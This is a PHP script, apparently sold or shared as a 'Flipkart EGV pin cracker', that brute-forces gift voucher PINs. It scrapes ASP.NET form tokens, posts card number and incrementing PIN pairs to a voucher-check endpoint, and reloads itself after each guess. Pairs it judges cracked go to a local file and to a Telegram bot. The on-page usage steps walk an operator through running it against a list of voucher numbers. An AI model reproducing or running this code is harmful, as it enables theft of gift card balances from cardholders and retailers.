<?php
session_start(); // Start the session

// Function to send a message to your Telegram bot
function sendMessageToTelegram($message) {
    $botToken = "my_bot_token"; // Replace with your Telegram bot API token
    $chatId = "my_chat_id"; // Replace with your chat ID

        $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message)."&parse_mode=MarkDown";
    file_get_contents($url); // Send the message to Telegram
}

// Password reset logic (you can run this via a cron job)
function resetPassword() {
    $newPassword = bin2hex(random_bytes(8)); // Generate a random password
    $_SESSION['password'] = $newPassword; // Update the session password
    $_SESSION['authenticated'] = false; // Mark the user as not authenticated
    sendMessageToTelegram("Your script has been triggered, and the new password is: `$newPassword`"); // Send the new password to your Telegram bot
}

// Check if it's time to reset the password (e.g., once a day)
if (!isset($_SESSION['last_reset']) || time() - $_SESSION['last_reset'] >= 86400) {
    resetPassword(); // Reset the password
    $_SESSION['last_reset'] = time(); // Update the last reset timestamp to the current time
}

// Check if the user is already authenticated
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    if (isset($_POST['password'])) {
        $userPassword = $_POST['password'];

        if ($userPassword === $_SESSION['password']) {
            // Password is correct, mark the user as authenticated
            $_SESSION['authenticated'] = true;
        } else {
            // Password is incorrect, display an error message
            echo "Incorrect or Expired API key. Firse dalo bhai.";
        }
    } else {
        // Display the password form if the user hasn't submitted a password
        ?>
        <!-- SOURCE ME KUCH NAHI MILEGA SARKAAR -->
        <form method="post">
            <center><h3>Flipkart EGV pin cracker script</h3></center>
            <center><label for="password">Enter woohoo API key:</label>
            <input type="password" id="password" name="password">
            <input type="submit" value="Submit">
            <h3>*USAGE*</h3>
            <h5>1) MAKE SURE TO CREATE OR PUT THIS PERTICULAR FILE IN xampp/htdocs FOLDER AND NAME IT AS hologram.php</h5>
            <h5>2) CREATE ANOTHER FILE AND NAME IT AS gvlist.txt AND PUT YOUR GV NUMBER IN THIS FILE</h5>
            <h5>3) IN URL COPY AND PASTE THIS http://localhost/hologram.php?egv=EGV_HERE&pin=100000 AND REPLACE EGV_HERE WITH YOUR INITIAL EGV NUMBER</h5>
            <h5>4) FOR WOOHOO API KEY CONTACT THE DEVELOPER BY CLICKING ON BUTTON <a href="my_telegram">𝙋𝙤𝙧𝙩𝙜𝙖𝙯 𝘿' 𝘼𝙘𝙚</a></h5>
            <h5>5) REMEMBER YOU SESSION WILL BE AUTOMATICALLY KILLED WITHIN 24 HOURS AND IN 24 HOUR YOU CAN ONLY GENERATE 4 API KEY</h5>
            <h5>6) TO GENERATE API KEY CLEAR ALL THE BROWER DATA AND COOKIES DATA CLOSE THE BROWSER AND REFRESH THE URL</h5>
            <h2 style="color:red;"><center>WARNING</center></h2>
            <h3 style="color:red;"> MAKE SURE YOU RUN THIS SCRIPT IN ICOGNITO MODE OR IN PRIVATE WINDOW BECAUSE THIS SCRIPT IS VERY POWERFULL AND GENERATE THOUSANDS OF COMBINATIONS WITHIN MINUTES IF YOU'LL RUN THIS SCRIPT IN NORMAL WINDOW THEN IT CAN BLOW YOUR BROWER BY FILLING UP THE HISTORY WITH MILLIONS OF COMBINATION OR IT CAN ALSO BLOW YOUR RDP</h3>
        </form>
        <?php
    }
}

// If the user is authenticated, proceed with your script's functionality here
if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
    ################## THIS IS A FULL AUTOMATED TRANSFORMER TO FETCH GIFTVOUCHER PIN MADE BY SHREEKRISHNA WITH <3##################
############################# TO GENERATE RANDOM ASP.NET SESSION [BETA PART WORK IN PROGRESS] #################
/*
// Define the character set from which to generate the code
$characters = '0123456789abcdefghijklmnopqrstuvwxyz';

// Initialize the code variable
$code = '';

// Set the length of the code
$codeLength = 24;

// Generate the random code
for ($i = 0; $i < $codeLength; $i++) {
    $code .= $characters[rand(0, strlen($characters) - 1)];
}

// Echo the generated code
//echo $code;
*/



##################################################################################
############################### GET REQUEST PART #################################
//shreekr1shna
$cx = curl_init();

curl_setopt($cx, CURLOPT_URL, 'my_api');
curl_setopt($cx, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($cx, CURLOPT_CUSTOMREQUEST, 'GET');

curl_setopt($cx, CURLOPT_ENCODING, 'gzip, deflate');

$newheads = array();
$newheads[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$newheads[] = 'Accept-Language: en-US,en;q=0.5';
$newheads[] = 'Sec-Fetch-Dest: document';
$newheads[] = 'Sec-Fetch-Mode: navigate';
$newheads[] = 'Sec-Fetch-Site: none';
$newheads[] = 'Sec-Fetch-User: ?1';
$newheads[] = 'Te: trailers';
$newheads[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt($cx, CURLOPT_HTTPHEADER, $newheads);

$newrex = curl_exec($cx);

if (curl_errno($cx)) {
    echo 'cURL error: ' . curl_error($cx);
} else {
    // Echo the response as plain text (HTML entities are escaped)
   // echo htmlspecialchars($newrex, ENT_QUOTES);
}

// Close cURL session
curl_close($cx);

$startPos = strpos($newrex, '__VIEWSTATE" value="');
if ($startPos !== false) {
    $startPos += strlen('__VIEWSTATE" value="');
    $endPos = strpos($newrex, '"', $startPos);

    if ($endPos !== false) {
        // Extract the value between the start and end positions.
        $viewStateValue = substr($newrex, $startPos, $endPos - $startPos);

        // Now, $viewStateValue contains the "__VIEWSTATE" value.
     //   echo 'viewstatecode : '.$viewStateValue;
        // url encode krne k baad
$encodedVariable = urlencode($viewStateValue);

//echo "<br>lode: ".$encodedVariable;

    } else {
        // Handle the case where the end position is not found.
        echo "End position not found.";
    }
} else {
    // Handle the case where the start position is not found.
    echo "__VIEWSTATE input field not found.";
}

// Find the start and end positions of the "__EVENTVALIDATION" input field.
$newstartPos = strpos($newrex, '__EVENTVALIDATION" value="');
if ($newstartPos !== false) {
    $newstartPos += strlen('__EVENTVALIDATION" value="');
    $newendPos = strpos($newrex, '"', $newstartPos);

    if ($newendPos !== false) {
        // chutiye ki value extract krna 
        $eventValidationValue = substr($newrex, $newstartPos, $newendPos - $newstartPos);

        // ab is variable k andar value hai
       // echo '<br>event code : '.$eventValidationValue;
              // url encode krne k baad
$encodedVariabletow = urlencode($eventValidationValue);

//echo "<br>lode tow: ".$encodedVariabletow;
    } else {
        // agar bhosdika nahi mila toh 
        echo "End position not found.";
    }
} else {
    // agar kuch bhi nahi mila toh 
    echo "__EVENTVALIDATION input field not found.";
}
############################# GET PART END HERE ##############################################
##############################################################################################

// new script to crack flipkart EGV pin only //
$ch = curl_init();

############################ EGV VARIABLE ################################

//create a varible that increase value itself to check the correct pin to bruteforce//
$egv = $_GET['egv']; //
//$egv = '';

############################ PIN CRACKER ###########################

$pin =  $_GET['pin']; // // You can pass the pin in URL



#########################  CURL INITIALIZATION #################################

curl_setopt($ch, CURLOPT_URL, 'my_api');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "__LASTFOCUS=&__EVENTTARGET=ctl00%24ContentPlaceHolder1%24EGMSButton1%24lbThemeButton&__EVENTARGUMENT=&__VIEWSTATE=".$encodedVariable."&__VIEWSTATEGENERATOR=176EB2EA&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=".$encodedVariabletow."&ctl00%24ContentPlaceHolder1%24txtCardNumber=".$egv."&ctl00%24ContentPlaceHolder1%24lstValidateOptions=Card+Pin%2FClaim+Code&ctl00%24ContentPlaceHolder1%24txtCardPin=".$pin."&ctl00%24ContentPlaceHolder1%24PolicyTextCheckbox=on&ctl00%24ContentPlaceHolder1%24hidRadBtnSelectedValue=Card+Pin%2FClaim+Code&ctl00%24PrinterColumn=&ctl00%24ReceiptText=");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Origin: my_API';
$headers[] = 'Referer: my_api';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'Te: trailers';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);

########## THIS WILL ADD NEW GV NUMBER FROM THE gvlist.txt AND EXECUTE SCRIPT FROM STARTING #######
#################### THIS WILL ONLY BE EXECUTED IF THE PIN IS CORRECT ####################

$newadd = "/Object moved/i";
if (preg_match($newadd, $result)) {
  $file = "gvlist.txt";
$f = fopen($file, 'r');
$line = fgets($f);
//echo $line;
fclose($f);

//do smth

$contents = file($file, FILE_IGNORE_NEW_LINES);
$first_line = array_shift($contents);
file_put_contents($file, implode("\r\n", $contents));
//echo $lulz;
 $link = 'http://localhost/hologram.php?egv='.$line.'&pin=100000';
echo '<meta http-equiv = "refresh" content = "0; url = '.$link.'" />';

}

############################### IF THE PIN IS CORRECT IT'LL SEND DATA AND ADD IT TEXT FILE ALSO ###########################



$pattern = "/Object moved/i"; // IF it returns 1 then pin is true and if its 0 then pin is false



if (preg_match($pattern, $result)){
    echo "[EGV found]";
    $egvpinfound = " Your EGV and pin is ";
    echo $egvpinfound;
    echo $egv .' :  ';
   // echo "EGV ping found";
   // echo " Your pin is ";
    echo $pin;
$file=fopen("crackedegv.txt", "a");
fwrite($file, $egv);
fwrite($file, '||');
fwrite($file, $pin);
fwrite($file, PHP_EOL);
fclose($file);
################## THIS WILL SEND THE DATA TO TELEGRAM USING TG BOT :__; ##################
$send = urlencode("`".$egv."` || `".$pin."`");
file_get_contents("https://api.telegram.org/bot(my_api)/sendmessage?text=".$send."&chat_id=my_chat&parse_mode=MarkDown");



} else {
    ######################### CODE FOR MATCHING WORS FOR INCORRECT PIN TO RETRY WITH NEW ONE ############



############## JSON ONNLY WORKING WHILE RETURNTRANSFER IS ON TABHI PREG MATCH JSON SE OUTPUT LEGA ##############



    //header("Location: http://192.168.65.2/work/egvcrackerFK.php?egv=".$egv."&pin=".++$pin);
  $notfound = "INCORRECT PIN, RETRYING WITH NEW PIN.... FOR EGV = ";
  echo $notfound;
  echo $egv."||";
  echo $pin;
}

$Incorrect = "/INCORRECT PIN/i";
if (preg_match($Incorrect, $notfound)) {
    //################ THIS CODE WILL ONLY BE EXECUTED IF THE PIN IS INCORRECT ############
   //header("Refresh: 0;");
   $link = 'http://localhost/hologram.php?egv='.$egv.'&pin='.++$pin;
echo '<meta http-equiv = "refresh" content = "0; url = '.$link.'" />';

  
}

    // For example, you can include and execute another PHP script:
    // include("your_script_login.php");
}
?>
